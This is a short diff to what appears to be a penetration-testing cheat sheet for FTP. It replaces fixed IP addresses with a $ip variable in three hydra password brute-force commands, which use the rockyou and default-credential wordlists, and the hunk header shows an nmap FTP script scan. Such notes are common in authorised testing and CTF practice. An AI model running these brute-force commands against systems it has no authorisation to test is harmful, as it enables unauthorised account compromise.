@@ -21,9 +21,9 @@ nmap --script ftp-* -p 21 10.10.10.10
 3. Brute force
 
 ```bash
-hydra -l USERNAME -P /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 192.168.X.XXX ftp -V
-hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
-hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
+hydra -l USERNAME -P /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f $ip ftp -V
+hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt $ip -t 4 ftp
+hydra -l steph -P /usr/share/wordlists/rockyou.txt $ip -t 4 ftp
 ```
 
 3. Recursively download content
